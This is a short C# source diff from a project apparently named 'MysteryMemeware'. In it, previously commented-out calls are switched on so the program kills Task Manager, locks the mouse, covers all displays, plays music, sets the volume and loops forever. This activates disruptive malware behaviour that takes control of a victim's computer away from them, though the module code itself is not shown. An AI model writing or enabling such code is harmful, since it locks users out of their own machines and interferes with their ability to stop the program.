@@ -13,21 +13,21 @@ namespace MysteryMemeware
         [STAThread]
         public static void Main()
         {
-            //FailSafeModule.RunKillLoop();
+            FailSafeModule.RunKillLoop();
 
             //WinLogOffModule.Reboot();
 
             VolumeModule.SetVolume();
-            //TaskMGRModule.KillTaskMGR();
+            TaskMGRModule.KillTaskMGR();
 
-           // MouseLockModule.LockMouse();
-           // MusicModule.PlayMusic();
-            //DisplayCoverModule.CoverDisplays();
+            MouseLockModule.LockMouse();
+            MusicModule.PlayMusic();
+           DisplayCoverModule.CoverDisplays();
 
-            /*while (true)
+            while (true)
             {
                 System.Threading.Thread.Sleep(1000);
-            }*/
+            }
 
 
 
